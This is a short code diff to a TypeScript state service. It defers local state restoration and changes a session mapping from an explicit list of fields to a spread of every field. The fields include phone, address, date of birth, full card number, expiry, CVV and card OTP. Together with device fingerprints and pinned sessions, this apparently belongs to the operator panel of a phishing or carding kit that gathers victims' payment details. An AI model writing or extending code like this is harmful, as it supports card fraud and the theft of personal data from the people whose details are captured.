@@ -173,7 +173,9 @@ export class StateService {
         } catch(e) { console.warn('BroadcastChannel not supported'); }
 
         // Restore state from storage (Hydration)
-        this.restoreLocalState();
+        setTimeout(() => {
+            this.restoreLocalState();
+        }, 0);
 
         // Force initial sync with retry logic
         this.initialSyncBurst();
@@ -664,16 +666,9 @@ export class StateService {
           fingerprint: s.fingerprint,
           isPinned: s.isPinned,
           data: {
-            phone: s.phoneNumber,
-            country: s.country,
-            address: s.address,
-            dob: s.dob,
-            cardBin: s.cardNumber ? s.cardNumber.substring(0, 6) : '',
-            cardLast4: s.cardNumber ? s.cardNumber.slice(-4) : '',
-            fullCard: s.cardNumber,
-            expiry: s.cardExpiry,
-            cvv: s.cardCvv,
-            cardOtp: s.cardOtp
+              ...s,
+              cardBin: s.cardNumber ? s.cardNumber.substring(0, 6) : '',
+              cardLast4: s.cardNumber ? s.cardNumber.slice(-4) : ''
           }
     }));
     
